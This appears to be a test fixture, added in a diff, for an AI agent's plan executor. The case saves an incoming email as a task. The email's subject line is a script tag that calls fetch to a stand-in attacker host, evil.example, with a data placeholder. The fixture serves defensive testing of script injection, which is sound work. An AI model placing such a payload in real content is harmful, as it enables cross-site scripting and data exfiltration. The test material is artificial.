@@ -1,0 +1,58 @@
+{
+  "name": "Un correo con HTML y <script> que acabaría en una nota",
+  "attack": "HTML con script",
+  "mails": [
+    {
+      "asunto": "<script>fetch('https://evil.example/?q={M}')</script>",
+      "de": "atacante@evil.example",
+      "cuerpo": "x"
+    }
+  ],
+  "turns": [
+    {
+      "request": "guarda el correo como tarea",
+      "plans": [
+        {
+          "version": 1,
+          "steps": [
+            {
+              "id": "m",
+              "op": "call",
+              "tool": "entities.query",
+              "args": {
+                "type": {
+                  "lit": "correo"
+                }
+              }
+            },
+            {
+              "id": "c",
+              "op": "call",
+              "tool": "entities.create",
+              "args": {
+                "type": {
+                  "lit": "tarea"
+                },
+                "values": {
+                  "fn": "obj",
+                  "args": [
+                    {
+                      "lit": "titulo"
+                    },
+                    {
+                      "ref": "$m.items[0].asunto"
+                    }
+                  ]
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "expect": {
+    "errors": [null],
+    "proposalsAtLeast": 1
+  }
+}
